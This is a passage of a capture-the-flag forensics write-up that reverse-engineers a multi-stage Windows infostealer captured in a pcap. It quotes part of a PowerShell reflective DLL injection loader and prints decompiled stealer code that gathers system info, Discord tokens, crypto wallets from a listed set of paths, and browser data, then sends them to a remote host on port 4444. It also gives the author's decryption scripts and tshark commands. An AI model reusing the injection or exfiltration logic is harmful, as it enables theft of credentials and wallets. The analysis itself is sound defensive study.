[N]::VirtualFreeEx($h,$a,0,0x8000)
[N]::CloseHandle($h)
Start-Sleep 2
try{Remove-Item $tempDll -Force -ErrorAction SilentlyContinue}catch{}'); $rukp = $rukp -join ''; . ([ScriptBlock]::Create($rukp))
```

First section downloads this file `http://192.168.59.152/user_profiles_photo/object.dat` and assigns `encryptedData` to this. Encryption is `AES with padding mode = Zeros??`. File is decrypted with the key and IV hex values and saved as `$tempDll=[System.IO.Path]::GetTempFileName()+".dll"` Then that DLL is injected into notepad.exe `C:\Windows\System32\notepad.exe`. Injection is done by using the `"PowerShell reflective DLL injection Add-Type VirtualAllocEx")` . Apparently this is a common malware technique to inject malicious DLL into normal apps.

That injected DLL comes from decrypted object.dat file by decrypting it with the details in `windows.ps1's decrypted powershell`:

```python
obj_file = './pwnsec/spiny-trace/extract/object.dat'

# Second stage, decrypt object.dat
k = bytearray.fromhex('8a4a35876563f1ea8baad6cda0099c24d53d4ce5670b3b23b13063127611bb37')
iv = bytearray.fromhex('c0a675360817d8dba62cc79e2fa77734')

with open(obj_file, 'rb') as f:
    enc = f.read()

cipher = AES.new(k, AES.MODE_CBC, iv)
dec_padded = cipher.decrypt(enc)

print(dec_padded)

with open('object.dll', 'wb') as f:
    enc = f.write(dec_padded)
```

With this we get the decrypted malicious DLL injected into notepad.exe by the powershell script. 

## Object.dat or object.dll?

Let's name this object.dll since it comes from decrypted object.dat. This DLL does a couple things I discovered by reversing it in Ghidra:

1. Downloads `http://192.168.59.152/user_profiles_photo/captcha.bin`

2. Decrypts the captcha.bin file here `cVar2 = FUN_180001000(&DAT_18001b440,0x20,local_2040,0xc,local_2058,local_20b0, local_20c0,&local_20ac,local_2030,0x10);` Looking inside that function, we can see that the encryption is AES-GCM. 

3. Taking a step back, before decryption is called, there are some operation on the memory:

![Captcha decryption](/assets/img/spiny_captcha.png)

Here we can see some interesting sizes: `12,16,28` 12 bytes could indicate that it is IV, and 16 bytes could be the tag. Following the numbers, it first read/copy 12 bytes, and then 16 bytes followed. And finally it reduces length by 28 while shifting/moving by 28. So if my assumption is correct, we got 12 byte IV + 16 bytes tag + Encrypted Data.

```python
# Third stage, decrypting captcha.bin
obj_file = './pwnsec/spiny-trace/extract/captcha.bin'

with open(obj_file, 'rb') as f:
    enc = f.read()

# Key extracted from object.dll
k = bytes.fromhex('d2 97 7b b8 17 0b c2 f4 f3 bd ce b9 1f 0e cb ac 48 d2 bc 6c 68 e5 d3 f1 35 f5 36 0a a2 63 e9 d4')
iv = enc[0:12]
tag = enc[12:28]
enc = enc[28:]

cipher = AES.new(k, AES.MODE_GCM, nonce=iv)
plaintext = cipher.decrypt_and_verify(enc, tag)

print(plaintext)

with open('./pwnsec/spiny-trace/captcha.dll', 'wb') as f:
    enc = f.write(plaintext)
```

4. Starts `Edge` browser process:
```
        sprintf(edge_exe,"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe");
        BVar2 = CreateProcessA((LPCSTR)0x0,edge_exe,(LPSECURITY_ATTRIBUTES)0x0,
                               (LPSECURITY_ATTRIBUTES)0x0,0,0,(LPVOID)0x0,(LPCSTR)0x0,&local_188,
                               &process_result);
```

5. Save somewhere in TEMP path involving `GetTempPathA GetCurrentProcessId GetTickCount` and `sprintf(param_1,"%s\\%s_%u_%u_%u.dll",local_128,param_3);` 

6. Tries to inject this new decrypted dll 5 times until successful. 

## Captcha.dll

Next is this newly decrypted captcha.dll. That DLL is injected into msedge.exe by the previous dll. We are getting close to resolution of this challenge

1. Downloads and runs chromelevator.exe `TEMP/chromelevator.exe --output=TEMP/chromelevator_output`

2. Collects exfiltration data from a couple of places: system info, registry, Discord data, Crypto Wallets, browser data. Here I tried to clean and rename decompiled output of data extraction:

```c++
void extract_everything(void)
{
    // Elevator gets downloaded and run
    download_run_elevator();
    GetTempPathA(0x104,temp_path);
    res_str = get_appdata_roaming();
    sprintf(stealer_data_path,"%s\\stealer_data.txt",res_str);

    // Extract registry, system info, IP etc.
    sys_info = (ulonglong *)get_system_info();
    sys_info_len = strlen((char *)sys_info);
    write_or_append_file(stealer_data_path,sys_info,(DWORD)sys_info_len);
    append_file(stealer_data_path,"\r\n\r\n");

    // List of process IDs and stuff
    processes_str = (ulonglong *)get_process_exfil();
    if (processes_str != (ulonglong *)0x0) {
      append_file(stealer_data_path,(char *)processes_str);
      append_file(stealer_data_path,"\r\n\r\n");
    }

    // Discord Data
    res_str = (undefined1 *)exfil_discord(local_ae0);
    if (NOT FOUND) {
      append_file(stealer_data_path,"=== DISCORD DATA ===\r\n\r\n[-] No Discord data found\r\n");
    }
    else {
      append_file(stealer_data_path,"=== DISCORD DATA ===\r\n\r\n");
      append_file(stealer_data_path,"TOKEN:\r\n");
      append_file(stealer_data_path,(char *)local_b10);
      append_file(stealer_data_path,"\r\n\r\nKEY:\r\n");
      append_file(stealer_data_path,(char *)local_b08);
      append_file(stealer_data_path,"\r\n\r\n");
    }

    // Extract crypto wallets if exists - checks about 14 wallets
    crypto_wallets = (ulonglong *)exfil_crypto();
    if (crypto_wallets != (ulonglong *)0x0) {
      append_file(stealer_data_path,(char *)crypto_wallets);
      append_file(stealer_data_path,"\r\n\r\n");
    }

    // If TEMP/Browsers folder exists add them to stealer_data.txt
    sprintf(temp_browsers_path,"%s\\Browsers",temp_path);
    if (EXISTS) {
      append_file(stealer_data_path,"\r\n=== BROWSER DATA ===\r\n\r\n");
      sprintf(local_558,"%s\\*",temp_browsers_path);
      local_b00 = FindFirstFileA(local_558,&cur_browser_path);
      if (local_b00 != (HANDLE)0xffffffffffffffff) {
        do {
          if ((cur_browser_path.dwFileAttributes & 0x10) == 0) {
            sprintf(local_448,"%s\\%s",temp_browsers_path,cur_browser_path.cFileName);
            local_b18 = (ulonglong *)FUN_180001430(local_448);
            if (local_b18 != (ulonglong *)0x0) {
              sprintf((char *)local_768,"\r\n--- %s ---\r\n",cur_browser_path.cFileName);
              append_file(stealer_data_path,(char *)local_768);
              append_file(stealer_data_path,(char *)local_b18);
            }
          }
          BVar2 = FindNextFileA(local_b00,&cur_browser_path);
        } while (BVar2 != 0);
        FindClose(local_b00);
      }
      sprintf(local_338,"rmdir /s /q \"%s\"",temp_browsers_path);
      execute((longlong)local_338);
    }

    i = common_getenv<>((undefined1 (*) [32])"COMPUTERNAME");
    if (i == 0) {
      comp_name = "Unknown";
    }
    else {
      comp_name = (char *)common_getenv<>((undefined1 (*) [32])"COMPUTERNAME");
    }
    sprintf((char *)final_res,
            "\r\n\r\n=== EXTRACTION SUMMARY ===\r\nTime: %s\r\nStatus: Complete\r\nTarget: %s\r\n",
            "22:23:46",comp_name);

    // Send the file over a socket connection
    append_file(stealer_data_path,(char *)final_res);
    socket_send((PUCHAR)just_ptr);
    free_and_check(just_ptr);
    cleanup();
}
```

Discord exfiltration function checks for `AppData/Roaming/discord` folder. It then looks for these files under there:

```c++
sprintf(loc_state_file,"%s\\Local State",discord_loc);
sprintf(leveldb_file,"%s\\Local Storage\\leveldb",discord_loc);
sprintf(logs,"%s\\*.log",local_468);
```

Crypto wallet exfiltration iterates over a list of crypto wallet names and their possible locations, 13 in total:

```
1 Phantom
Google\Chrome\UserData\Default\Local Extension Settings\bfnaelmomeimdmbdomapblpkbdommffh

2 Coinbase Wallet
Google\Chrome\UserData\Default\Local Extension Settings\hnfanknocfeofbddgcijnmhnfnkdnaad

3 TrustWallet
Google\Chrome\UserData\Default\Local Extension Settings\egjidjbpglichdbfbcdaemkapbeebhbf

4 Brave Wallet
Brave Software\Brave-Browser\UserData\Default\Local Extension Settings\odbfpeeihdkbihmbbkbmgckblolcjcji

5 Exodus
Exodus\exodus wallet

6 Electrum
Electrum\wallets

7 Wasabi Wallet
Wasabi Wallet\Wallets

8 Sparrow Wallet
Sparrow\wallets

9 Bitcoin Core
Bitcoin

10 Litecoin Core
Litecoin

11 Dogecoin Core
Dogecoin

12 Dash Core
DashCore

13 Monero GUI
monero\wallets
```

For each extraction step, at the end collected data sent over a socket connection: 

```c++
    // End of first step, chrome elevator
      sprintf((char *)local_218,"\r\n=== CHROME ELEVATOR OUTPUT ===\r\nDirectory: %s\r\n\r\n",
              elevator_out);
      socket_send(local_218);
      exfil_files(elevator_out,(char *)0x0);
      socket_send((PUCHAR)"\r\n=== END OF CHROME ELEVATOR OUTPUT ===\r\n");
      sprintf(temp_browsers_folder,"%s\\Browsers",temp_folder);
      move_folder(elevator_out,temp_browsers_folder);

    // End of crypto wallet extraction
    sprintf((char *)local_1018,"\r\n--- Wallet Data ---\r\n%s\r\n",local_1570);
    socket_send(local_1018);
    free_and_check(local_1570);

    // End of stealer_data.txt : system info, discord data, browser data etc
    sprintf((char *)local_228,
            "\r\n\r\n=== EXTRACTION SUMMARY ===\r\nTime: %s\r\nStatus: Complete\r\nTarget: %s\r\n",
            "22:23:46",comp_name);
    append_file(stealer_data_path,(char *)local_228);
    append_str((ulonglong *)just_ptr,local_228);
    socket_send((PUCHAR)just_ptr);
      
```

Encryption is AES-GCM where AES key is extracted from memory (2b 7e 15 16 28 ae d2 a6 ab f7 15 88 09 cf 4f 3c):

```c++
    memset_maybe(local_a8,0,(longlong)(new_len + 1));
    memcpyish((undefined8 *)local_a8,(undefined8 *)IV,0xc);
    memset_maybe((undefined1 (*) [32])&bcrypt_struct,0,0x58);
    bcrypt_struct = 0x58;
    local_84 = 1;
    local_80 = IV;
    local_78 = 0xc;
    local_60 = *local_a8 + (longlong)(int)*len + 0xc;
    local_58 = 0x10;
    local_9c = 0;
    NVar1 = BCryptEncrypt(gen_key,plaintext,*len,&bcrypt_struct,(PUCHAR)0x0,0,
                        *local_a8 + 0xc,*len,&local_9c,0);
```

Few things to note, IV/nonce is attached to output before encryption, so first `12 bytes` of data is IV. Encrypt call writes to output right after it. So we expect the received format to be `IV + ENC + TAG`. Key is already extracted from memory, so decrypting data is simple now:

```python
import base64
import struct
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

k = bytes.fromhex('2b 7e 15 16 28 ae d2 a6 ab f7 15 88 09 cf 4f 3c')

def decrypt(encin):
    iv = encin[0:12]
    enc = encin[12:len(encin)-16]
    tag = encin[len(encin)-16:]

    cipher = AES.new(k, AES.MODE_GCM, nonce=iv)
    plaintext = cipher.decrypt_and_verify(enc, tag)

    print(plaintext.decode('utf-8', errors='replace'))
    return plaintext

enc1 = bytes.fromhex('033b1bd50cde58853fadffe08d1c0d3ac621e4da4e48ee131da5a72bd99d064af7af76f49095a693739f18714f41b6e15fe3eda04336309000')
decrypt(enc1)    
```

Looking back at the socket send logic, 4 additional bytes are sent as length before sending the encrypted data:

```c++
iVar1 = send(s,(char *)&length,4,0);

tot_send = 0;
while ((tot_send < (int)len[0] &&
        (numSent = send(s,(char *)((longlong)enc_out + (longlong)tot_send),
                        len[0] - tot_send,0), numSent != -1))) {
    tot_send = tot_send + numSent;
}
```

We also know that this data is exfiltrated from `192.168.59.133` to `ip.dst==192.168.59.152` on port `4444`. We can extract all  the data sent from victim to server with tshark:

```
tshark -r challenge.pcapng -Y "ip.src==192.168.59.133 && ip.dst==192.168.59.152 && tcp.port==4444 && tcp.len>0" -T fields -e data > raw_hex.txt
```

Note this adds some newlines, I replaced them in text editor before processing to make sure it doesn't cause issues. And then we get a big one line of hex of sent bytes from victim: `000000856330d8f2c99b90daf7db3ced1f16e4c11.....`

We can now process this by reading length, extracting encrypted data, and then decrypting using the decryption we implemented above:

```python
import base64
import struct
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

k = bytes.fromhex('2b 7e 15 16 28 ae d2 a6 ab f7 15 88 09 cf 4f 3c')

def decrypt(encin):
    iv = encin[0:12]
    enc = encin[12:len(encin)-16]
    tag = encin[len(encin)-16:]

    cipher = AES.new(k, AES.MODE_GCM, nonce=iv)
    plaintext = cipher.decrypt_and_verify(enc, tag)

    print(plaintext.decode('utf-8', errors='replace'))
    return plaintext


with open('./pwnsec/spiny-trace/raw_hex.txt', 'r') as f:
    data = f.read()


data = bytes.fromhex(data)
offset = 0
messages = []

while offset < len(data):
    length = struct.unpack('>I', data[offset:offset+4])[0]
    offset += 4

    payload = data[offset:offset+length]
    offset += length

    messages.append(payload)

for i, msg in enumerate(messages):
    decrypt(msg)


# You can run and save output to a file if you want:
# python decryptor.py > decrypted_exfil.txt    
```

Now we get the decrypted exfiltrated data. I don't have the questions of the challenge, but I can see a few possible interesting data points in the decrypted result:

```

--- FILE: Chrome\Default\passwords.json (85 bytes) ---

[
{"url":"https://www.instagram.com/","user":"clarke","pass":"v@VboF8EDZWPM5nv7"}
]

=== SYSTEM INFORMATION ===
OS Version: Windows 10 Enterprise LTSC 2021
HWID: 79ef6f3e-52e3-4506-840a-52a759063342
Local IP: 192.168.59.133
MAC Address: 00:0C:29:F7:95:1E
Antivirus: Windows Defender


=== DISCORD DATA ===

[-] No Discord data found

=== CRYPTO WALLETS ===

[-] No crypto wallets found

=== EXTRACTION SUMMARY ===
Time: 22:23:46
Status: Complete
Target: DESKTOP-Q9N84B2
```

We also receive a big list of cookies, not sure if they are part of questions. I might update this writeup if I ever get access to questions of the challenge. My feeling is that I probably covered most probable questions you could ask from this capture but you never know.

Fun challenge if you like decrypting AES after AES :) How many was there, maybe like 4 or 5 encryptions? Compared to previous challenge <https://yusuftas.net/posts/pwnsecctf-blindsided-writeup> this one feels like had more steps to process, but it didn't feel more complicated than blindsided.

Time to wrap this up, as always, keep learning!